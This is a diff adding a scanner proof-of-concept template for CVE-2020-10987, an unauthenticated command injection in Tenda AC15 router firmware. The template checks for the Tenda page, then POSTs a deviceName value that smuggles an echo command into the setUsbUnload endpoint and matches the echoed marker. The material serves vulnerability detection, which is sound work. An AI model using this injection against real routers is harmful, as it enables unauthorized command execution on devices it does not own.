@@ -1,0 +1,48 @@
+[info]
+author = "AVE"
+description = "检测 Tenda AC15 AC1900 固件 15.03.05.19 中 goform/setUsbUnload 接口的命令注入漏洞。攻击者可通过 deviceName 参数注入任意系统命令，无需身份认证。"
+id = "POC-AVE-2020-0200"
+name = "Tenda AC15 AC1900 命令注入漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2020-10987",
+    "tenda",
+    "command-injection",
+    "rce",
+]
+vuln_id = [
+    "CVE-2020-10987",
+    "AVE-2020-0200",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Tenda WiFi"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/goform/setUsbUnload"
+protocol = "http"
+
+[poc.requests.body]
+content = "deviceName=test;echo%20AVE_TEST;"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
